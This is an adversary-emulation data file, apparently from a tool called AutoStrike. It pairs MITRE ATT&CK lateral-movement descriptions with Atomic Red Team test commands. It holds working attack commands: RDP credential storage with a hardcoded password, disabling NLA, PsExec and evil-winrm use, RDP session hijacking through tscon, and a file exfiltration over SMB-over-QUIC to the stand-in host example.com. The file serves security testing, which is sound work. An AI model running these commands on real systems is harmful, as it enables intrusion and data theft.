# AutoStrike MITRE ATT&CK Techniques - lateral-movement
# Auto-generated by mitre-import script
# Source: MITRE ATT&CK STIX 2.1 + Atomic Red Team

- id: T1021.001
  name: Remote Desktop Protocol
  description: "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.\n\nRemote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).[TechNet Remote Desktop Services](https://technet.microsoft.com/en-us/windowsserver/ee236407.aspx) \n\nAdversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the [Accessibility Features](https://attack.mitre.org/techniques/T1546/008) or [Terminal Services DLL](https://attack.mitre.org/techniques/T1505/005) for Persistence.[Alperovitch Malware](https://web.archive.org/web/20191115195333/https://www.crowdstrike.com/blog/adversary-tricks-crowdstrike-treats/)"
  tactic: lateral-movement
  platforms:
    - windows
  executors:
    - name: RDP to DomainController
      type: powershell
      platform: windows
      command: |-
        $Server=$ENV:logonserver.TrimStart("\")
        $User = Join-Path $Env:USERDOMAIN $ENV:USERNAME
        $Password="1password2!"
        cmdkey /generic:TERMSRV/$Server /user:$User /pass:$Password
        mstsc /v:$Server
        echo "RDP connection established"
      cleanup: |-
        $p=Tasklist /svc /fi "IMAGENAME eq mstsc.exe" /fo csv | convertfrom-csv
        if(-not ([string]::IsNullOrEmpty($p.PID))) { Stop-Process -Id $p.PID }
      timeout: 120
      is_safe: true
    - name: Changing RDP Port to Non Standard Port via Powershell
      type: powershell
      platform: windows
      command: |-
        Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "PortNumber" -Value 4489
        New-NetFirewallRule -DisplayName 'RDPPORTLatest-TCP-In' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 4489
      cleanup: "Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -name \"PortNumber\" -Value 3389\nRemove-NetFirewallRule -DisplayName \"RDPPORTLatest-TCP-In\" -ErrorAction Ignore \nGet-Service TermService | Restart-Service -Force -ErrorAction Ignore"
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Changing RDP Port to Non Standard Port via Command_Prompt
      type: cmd
      platform: windows
      command: |-
        reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 4489 /f
        netsh advfirewall firewall add rule name="RDPPORTLatest-TCP-In" dir=in action=allow protocol=TCP localport=4489
      cleanup: |-
        reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 3389 /f >nul 2>&1
        netsh advfirewall firewall delete rule name="RDPPORTLatest-TCP-In" >nul 2>&1
        net stop TermService /y >nul 2>&1
        net start TermService >nul 2>&1
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Disable NLA for RDP via Command Prompt
      type: cmd
      platform: windows
      command: reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /d 0 /t REG_DWORD /f
      cleanup: reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /d 1 /t REG_DWORD -f >nul 2>&1
      timeout: 120
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1021/001
  is_safe: true
- id: T1021.002
  name: SMB/Windows Admin Shares
  description: |-
    Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.

    SMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.

    Windows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include `C$`, `ADMIN$`, and `IPC$`. Adversaries may use this technique in conjunction with administrator-level [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely access a networked system over SMB,[Wikipedia Server Message Block](https://en.wikipedia.org/wiki/Server_Message_Block) to interact with systems using remote procedure calls (RPCs),[TechNet RPC](https://technet.microsoft.com/en-us/library/cc787851.aspx) transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Service Execution](https://attack.mitre.org/techniques/T1569/002), and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). Adversaries can also use NTLM hashes to access administrator shares on systems with [Pass the Hash](https://attack.mitre.org/techniques/T1550/002) and certain configuration and patch levels.[Microsoft Admin Shares](http://support.microsoft.com/kb/314984)
  tactic: lateral-movement
  platforms:
    - windows
  executors:
    - name: Map admin share
      type: cmd
      platform: windows
      command: cmd.exe /c "net use \\Target\C$ P@ssw0rd1 /u:DOMAIN\Administrator"
      timeout: 120
      is_safe: true
    - name: Map Admin Share PowerShell
      type: powershell
      platform: windows
      command: New-PSDrive -name g -psprovider filesystem -root \\Target\C$
      timeout: 120
      is_safe: true
    - name: Copy and Execute File with PsExec
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" \\localhost -accepteula -c C:\Windows\System32\cmd.exe'
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Execute command writing output to local Admin Share
      type: cmd
      platform: windows
      command: cmd.exe /Q /c hostname 1> \\127.0.0.1\ADMIN$\output.txt 2>&1
      timeout: 120
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1021/002
  is_safe: true
- id: T1021.003
  name: Distributed Component Object Model
  description: |-
    Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with remote machines by taking advantage of Distributed Component Object Model (DCOM). The adversary may then perform actions as the logged-on user.

    The Windows Component Object Model (COM) is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE). Distributed COM (DCOM) is transparent middleware that extends the functionality of COM beyond a local computer using remote procedure call (RPC) technology.[Fireeye Hunting COM June 2019](https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html)[Microsoft COM](https://msdn.microsoft.com/library/windows/desktop/ms680573.aspx)

    Permissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry.[Microsoft Process Wide Com Keys](https://msdn.microsoft.com/en-us/library/windows/desktop/ms687317(v=vs.85).aspx) By default, only Administrators may remotely activate and launch COM objects through DCOM.[Microsoft COM ACL](https://docs.microsoft.com/en-us/windows/desktop/com/dcom-security-enhancements-in-windows-xp-service-pack-2-and-windows-server-2003-service-pack-1)

    Through DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications[Enigma Outlook DCOM Lateral Movement Nov 2017](https://enigma0x3.net/2017/11/16/lateral-movement-using-outlooks-createobject-method-and-dotnettojscript/) as well as other Windows objects that contain insecure methods.[Enigma MMC20 COM Jan 2017](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)[Enigma DCOM Lateral Movement...
  tactic: lateral-movement
  platforms:
    - windows
  executors:
    - name: PowerShell Lateral Movement using MMC20
      type: powershell
      platform: windows
      command: '[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","localhost")).Document.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe", $null, $null, "7")'
      timeout: 120
      is_safe: true
    - name: PowerShell Lateral Movement Using Excel Application Object
      type: powershell
      platform: windows
      command: |-
        copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe'
        $com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application","localhost"))
        $com.ActivateMicrosoftApp("5")
      cleanup: Remove-Item 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe'
      timeout: 120
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1021/003
  is_safe: true
- id: T1021.005
  name: VNC
  description: |-
    Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely control machines using Virtual Network Computing (VNC).  VNC is a platform-independent desktop sharing system that uses the RFB (“remote framebuffer”) protocol to enable users to remotely control another computer’s display by relaying the screen, mouse, and keyboard inputs over the network.[The Remote Framebuffer Protocol](https://datatracker.ietf.org/doc/html/rfc6143#section-7.2.2)

    VNC differs from [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) as VNC is screen-sharing software rather than resource-sharing software. By default, VNC uses the system's authentication, but it can be configured to use credentials specific to VNC.[MacOS VNC software for Remote Desktop](https://support.apple.com/guide/remote-desktop/set-up-a-computer-running-vnc-software-apdbed09830/mac)[VNC Authentication](https://help.realvnc.com/hc/en-us/articles/360002250097-Setting-up-System-Authentication)

    Adversaries may abuse VNC to perform malicious actions as the logged-on user such as opening documents, downloading files, and running arbitrary commands. An adversary could use VNC to remotely control and monitor a system to collect data and information to pivot to other systems within the network. Specific VNC libraries/implementations have also been susceptible to brute force attacks and memory usage exploitation.[Hijacking VNC](https://int0x33.medium.com/day-70-hijacking-vnc-enum-brute-access-and-crack-d3d18a4601cc)[macOS root VNC login without authentication](https://www.tenable.com/blog/detecting-macos-high-sierra-root-account-without-authentication)[VNC Vulnerabilities](https://www.bleepingcomputer.com/news/security/dozens-of-vnc-vulnerabilities-found-in-linux-windows-solutions/)[Offensive Security VNC Authentication Check](https://www.offensive-security.com/metasploit-unleashed/vnc-authentication/)[Attacking VNC Servers PentestLab](https://pentestlab.blog/2012/10/30...
  tactic: lateral-movement
  platforms:
    - linux
    - windows
    - macos
  executors:
    - name: Enable Apple Remote Desktop Agent
      type: sh
      platform: macos
      command: sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -allowAccessFor -allUsers -privs -all -quiet
      cleanup: sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -deactivate -stop -configure -privs -none -quiet
      timeout: 60
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1021/005
  is_safe: false
- id: T1021.006
  name: Windows Remote Management
  description: |-
    Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with remote systems using Windows Remote Management (WinRM). The adversary may then perform actions as the logged-on user.

    WinRM is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services).[Microsoft WinRM](https://learn.microsoft.com/en-us/windows/win32/winrm/portal) It may be called with the `winrm` command or by any number of programs such as PowerShell.[Jacobsen 2014](https://www.slideshare.net/kieranjacobsen/lateral-movement-with-power-shell-2) WinRM  can be used as a method of remotely interacting with [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).[MSDN WMI](https://msdn.microsoft.com/en-us/library/aa394582.aspx)
  tactic: lateral-movement
  platforms:
    - windows
  executors:
    - name: Enable Windows Remote Management
      type: powershell
      platform: windows
      command: Enable-PSRemoting -Force
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Remote Code Execution with PS Credentials Using Invoke-Command
      type: powershell
      platform: windows
      command: |-
        Enable-PSRemoting -Force
        Invoke-Command -ComputerName $env:COMPUTERNAME -ScriptBlock {whoami}
      cleanup: Disable-PSRemoting -Force
      timeout: 120
      is_safe: true
    - name: WinRM Access with Evil-WinRM
      type: powershell
      platform: windows
      command: evil-winrm -i Target -u Domain\Administrator -p P@ssw0rd1
      timeout: 120
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1021/006
  is_safe: true
- id: T1091
  name: Replication Through Removable Media
  description: |-
    Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself.

    Mobile devices may also be used to infect PCs with malware if connected via USB.[Exploiting Smartphone USB ](https://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.226.3427&rep=rep1&type=pdf) This infection may be achieved using devices (Android, iOS, etc.) and, in some instances, USB charging cables.[Windows Malware Infecting Android](https://www.computerworld.com/article/2486903/windows-malware-tries-to-infect-android-devices-connected-to-pcs.html)[iPhone Charging Cable Hack](https://techcrunch.com/2019/08/12/iphone-charging-cable-hack-computer-def-con/) For example, when a smartphone is connected to a system, it may appear to be mounted similar to a USB-connected disk drive. If malware that is compatible with the connected system is on the mobile device, the malware could infect the machine (especially if Autorun features are enabled).
  tactic: lateral-movement
  tactics:
    - lateral-movement
    - initial-access
  platforms:
    - windows
  executors:
    - name: USB Malware Spread Simulation
      type: powershell
      platform: windows
      command: |-
        $RemovableDrives=@()
        $RemovableDrives = Get-WmiObject -Class Win32_LogicalDisk -filter "drivetype=2" | select-object -expandproperty DeviceID
        ForEach ($Drive in $RemovableDrives)
        {
        write-host "Removable Drive Found:" $Drive
        New-Item -Path $Drive/T1091Test1.txt -ItemType "file" -Force -Value "T1091 Test 1 has created this file to simulate malware spread to removable drives."
        }
      cleanup: |-
        $RemovableDrives = Get-WmiObject -Class Win32_LogicalDisk -filter "drivetype=2" | select-object -expandproperty DeviceID
        ForEach ($Drive in $RemovableDrives)
        {
        Remove-Item -Path $Drive\T1091Test1.txt -Force -ErrorAction Ignore
        }
      timeout: 120
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1091
  is_safe: true
- id: T1563.002
  name: RDP Hijacking
  description: |-
    Adversaries may hijack a legitimate user’s remote desktop session to move laterally within an environment. Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).[TechNet Remote Desktop Services](https://technet.microsoft.com/en-us/windowsserver/ee236407.aspx)

    Adversaries may perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session. With System permissions and using Terminal Services Console, `c:\windows\system32\tscon.exe [session number to be stolen]`, an adversary can hijack a session without the need for credentials or prompts to the user.[RDP Hijacking Korznikov](http://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html) This can be done remotely or locally and with active or disconnected sessions.[RDP Hijacking Medium](https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6) It can also lead to [Remote System Discovery](https://attack.mitre.org/techniques/T1018) and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in red teaming tools.[Kali Redsnarf](https://github.com/nccgroup/redsnarf)
  tactic: lateral-movement
  platforms:
    - windows
  executors:
    - name: RDP hijacking
      type: cmd
      platform: windows
      command: |-
        query user
        sc.exe create sesshijack binpath= "cmd.exe /k tscon 1337 /dest:rdp-tcp#55"
        net start sesshijack
      cleanup: sc.exe delete sesshijack >nul 2>&1
      timeout: 120
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1563/002
  is_safe: false
- id: T1570
  name: Lateral Tool Transfer
  description: |-
    Adversaries may transfer tools or other files between systems in a compromised environment. Once brought into the victim environment (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) files may then be copied from one system to another to stage adversary tools or other files over the course of an operation.

    Adversaries may copy files between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) to connected network shares or with authenticated connections via [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001).[Unit42 LockerGoga 2019](https://unit42.paloaltonetworks.com/born-this-way-origins-of-lockergoga/)

    Files can also be transferred using native or otherwise present tools on the victim system, such as scp, rsync, curl, sftp, and [ftp](https://attack.mitre.org/software/S0095). In some cases, adversaries may be able to leverage [Web Service](https://attack.mitre.org/techniques/T1102)s such as Dropbox or OneDrive to copy files from one machine to another via shared, automatically synced folders.[Dropbox Malware Sync](https://www.technologyreview.com/2013/08/21/83143/dropbox-and-similar-services-can-sync-malware/)
  tactic: lateral-movement
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Exfiltration Over SMB over QUIC (New-SmbMapping)
      type: powershell
      platform: windows
      command: |-
        New-SmbMapping -RemotePath '\\example.com\sales' -TransportType QUIC -SkipCertificateCheck
        copy 'C:\path\to\file.txt' 'Z:\'
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Exfiltration Over SMB over QUIC (NET USE)
      type: powershell
      platform: windows
      command: |-
        NET USE * '\\example.com\sales' /TRANSPORT:QUIC /SKIPCERTCHECK
        copy 'C:\path\to\file.txt' '*:\'
      timeout: 120
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1570
  is_safe: false
